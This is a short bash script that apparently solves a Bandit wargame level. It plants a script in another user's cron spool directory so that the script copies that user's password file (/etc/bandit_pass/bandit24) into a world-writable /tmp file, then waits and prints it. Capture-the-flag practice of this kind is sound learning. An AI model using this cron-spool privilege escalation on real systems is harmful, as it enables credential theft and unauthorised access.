#!/bin/bash

if [ -d /tmp/fii ]; then
    echo
else
    mkdir /tmp/fii
    chmod 777 /tmp/fii
fi

touch /tmp/fii/fill
chmod 777 /tmp/fii/fill

touch /tmp/fii/z.sh
chmod 777 /tmp/fii/z.sh

echo "#!/bin/bash" > /tmp/fii/z.sh
echo "cat /etc/bandit_pass/bandit24 > /tmp/fii/fill" >> /tmp/fii/z.sh

mv /tmp/fii/z.sh /var/spool/bandit24/foo

a=62
while [ $a -gt 0 ]
do
    ((a--))
    echo "a: $a"
    sleep 1
done

cat /tmp/fii/fill
